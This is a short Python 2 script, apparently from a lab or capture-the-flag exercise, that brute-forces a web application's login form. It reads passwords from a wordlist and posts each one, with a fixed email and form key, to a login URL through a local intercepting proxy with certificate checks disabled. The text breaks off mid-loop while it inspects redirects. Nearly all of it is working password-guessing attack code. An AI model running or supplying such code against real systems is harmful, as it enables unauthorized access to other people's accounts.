import requests
from requests_toolbelt import MultipartEncoder
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {"https":"http://127.0.0.1:8080"}

headers={'Host':'ip:8000',
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
'Referer':'https://ip:8000/user/login?_next=/',
'Cookie':'session_id_issue_tracker='}

with open('testwords','r') as words:
	for password in words.readlines():
		password = password.strip()
		m = MultipartEncoder(
			fields = [
			('email',(None,'test@gmail.com')),
			('password',(None,password)),
			('_next',(None,'/')),
			('_formkey',(None,'823bbe53-a952-49bd-8db2-6eb7b8c0d782')),
			('_formname',(None,'login')),
		]
			)
		# also tried using files==> 
		'''
		files = [
			('email',(None,'test@gmail.com')),
			('password',(None,password)),
			('_next',(None,'/')),
			('_formkey',(None,'823bbe53-a952-49bd-8db2-6eb7b8c0d782')),
			('_formname',(None,'login')),
		]
		'''
		r=requests.post('https://ip:8000/user/login?_next=/',headers=headers,proxies=proxy,data=m,verify=False)
		print '[+] Trying password %s'%password
		if r.history:
			for resp in r.history:

